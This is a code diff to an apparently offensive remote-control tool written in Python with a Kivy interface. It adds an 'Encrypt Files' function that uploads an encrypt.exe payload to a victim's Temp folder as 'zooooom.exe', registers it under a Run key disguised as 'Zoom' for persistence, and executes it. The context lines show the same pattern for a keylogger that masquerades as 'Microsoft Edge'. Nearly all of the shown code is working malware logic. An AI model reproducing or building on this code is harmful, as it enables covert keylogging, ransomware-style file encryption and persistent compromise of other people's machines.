@@ -103,7 +103,7 @@ ScreenManager:
                     id: firewallBtn
                     text: "Firewall"
                     on_press: app.Firewall()
-                    
+
                 OneLineListItem:
                     id: denyFileBtn
                     text: "Deny Files"
@@ -112,21 +112,26 @@ ScreenManager:
                     id: openBrowser
                     text: "Open Browsers"
                     on_press: app.OpenBrowsers()
-                    
+
                 OneLineListItem:
                     id: instkeyloggerBtn
                     text: "Install Key Logger"
                     on_press: app.KeyloggerInstall()
-                    
+
                 OneLineListItem:
                     id: keyloggerBtn
                     text: "Key Logger Start"
                     on_press: app.KeyloggerInit()
-                
+
                 OneLineListItem:
                     id: keyloggerstopBtn
                     text: "Key Logger Stop"
                     on_press: app.KeyloggerStop()
+                    
+                OneLineListItem:
+                    id: encryptfilesBtn
+                    text: "Encrypt Files"
+                    on_press: app.EncryptFiles()
         MDTextField:
             id: disruptConsoleField
             max_height: '200dp'
@@ -156,8 +161,9 @@ ScreenManager:
         hint_text: 'Enter File Path'
 '''
 # Server IP and Port
-HOST = '127.0.0.1'  # Temporary localhost for testing (Make sure to use the client's IP during production
+HOST = '192.168.221.1'  # Temporary localhost for testing (Make sure to use the client's IP during production
 PORT = 21420
+
 
 class Main(MDApp):
     def build(self):
@@ -174,7 +180,7 @@ class Main(MDApp):
         # print('Server started!')
 
         # A max of one client can be listend at a time
-        self.server.listen(1)
+        self.server.listen(3)
         self.root.ids.statusLbl.text = 'Listening for a client connection to be established...'
         # print('Listening for a client connection to be established...')
         self.root.ids.startBtn.disabled = True
@@ -547,20 +553,20 @@ class Main(MDApp):
             print('Command sent to client: ', command)
             recvsize = self.currConn.recv(1024).decode()
             isExist = self.currConn.recv(int(recvsize)).decode()
-            
-            # Send payload to target if it isn't there yet            
+
+            # Send payload to target if it isn't there yet
             if isExist.strip() == "False":
                 print("Sending keylogger payload to victim.")
-                
+
                 # File transfer mode
                 self.currConn.send("ft_True".encode())
                 time.sleep(0.02)
-                
-                # Send target path and size of file    
+
+                # Send target path and size of file
                 self.currConn.send(str("echo " + tpath).encode())
                 self.currConn.send(str(os.path.getsize(kpath)).encode())
                 time.sleep(1)
-                
+
                 # Send exe in packets with size 8192
                 f = open(kpath, 'rb')
                 bytesToSend = f.read(8192)
@@ -574,14 +580,14 @@ class Main(MDApp):
                 print("[VICTIM]: ", self.currConn.recv(1024).decode())
                 time.sleep(0.05)
                 # Add payload to registry to run on login
-                
+
                 command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Microsoft Edge" /t REG_SZ /d "{tpath}" /f'
                 self.currConn.send(command.encode())
                 print('Command sent to client: ', command)
                 recvsize = self.currConn.recv(1024).decode()
                 output = self.currConn.recv(int(recvsize)).decode()
                 print('Registry add: ', output)
-                
+
                 # Run payload once
                 time.sleep(0.05)
                 self.currConn.send("exe_True".encode())
@@ -596,7 +602,7 @@ class Main(MDApp):
             break
 
     def KeyloggerInit(self):
-        threading.Thread(target=self.Keylogger).start() #figure out how to kill thread
+        threading.Thread(target=self.Keylogger).start()  # figure out how to kill thread
 
     def KeyloggerStop(self):
         self.exitKeyLogger.set()
@@ -604,8 +610,8 @@ class Main(MDApp):
     def Keylogger(self):
         try:
             self.exitKeyLogger.clear()
-            
-            # Connect to keylogger on port 47620       
+
+            # Connect to keylogger on port 47620
             klserver = socket.socket()
             klserver.bind((HOST, 47620))
             klserver.listen()
@@ -623,6 +629,64 @@ class Main(MDApp):
 
         except:
             pass
+
+    def EncryptFiles(self):
+        tpath = "%USERPROFILE%\\AppData\\Local\\Temp\\zooooom.exe"
+        kpath = os.path.join(os.getcwd(), "encrypt.exe")
+        while True:
+            # Check if payload is already on the target machine
+            command = f'if exist {tpath.rstrip()} (echo True) else (echo False)'
+            self.currConn.send(command.encode())
+            print('Command sent to client: ', command)
+            recvsize = self.currConn.recv(1024).decode()
+            isExist = self.currConn.recv(int(recvsize)).decode()
+
+            # Send payload to target if it isn't there yet
+            if isExist.strip() == "False":
+                print("Sending encryptfile payload to victim.")
+
+                # File transfer mode
+                self.currConn.send("ft_True".encode())
+                time.sleep(0.02)
+
+                # Send target path and size of file
+                self.currConn.send(str("echo " + tpath).encode())
+                self.currConn.send(str(os.path.getsize(kpath)).encode())
+                time.sleep(1)
+
+                # Send exe in packets with size 8192
+                f = open(kpath, 'rb')
+                bytesToSend = f.read(8192)
+                self.currConn.send(bytesToSend)
+                totalSent = len(bytesToSend)
+                while totalSent < os.path.getsize(kpath):
+                    bytesToSend = f.read(8192)
+                    totalSent = totalSent + len(bytesToSend)
+                    self.currConn.send(bytesToSend)
+                f.close()
+                print("[VICTIM]: ", self.currConn.recv(1024).decode())
+                time.sleep(0.05)
+
+                # Add payload to registry to run on login
+                command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Zoom" /t REG_SZ /d "{tpath}" /f'
+                self.currConn.send(command.encode())
+                print('Command sent to client: ', command)
+                recvsize = self.currConn.recv(1024).decode()
+                output = self.currConn.recv(int(recvsize)).decode()
+                print('Registry add: ', output)
+
+                # Run payload once
+                time.sleep(0.05)
+                self.currConn.send("exe_True".encode())
+                command = tpath
+                self.currConn.send(command.encode())
+                print('Command sent to client: ', command)
+                output2 = self.currConn.recv(1024).decode()
+                time.sleep(5)
+                print(f"EncryptFile{output2}")
+            else:
+                print("EncryptFile already installed on target machine.")
+            break
 
     def DisruptionMenu(self):
         self.root.current = "disruptionMenu"
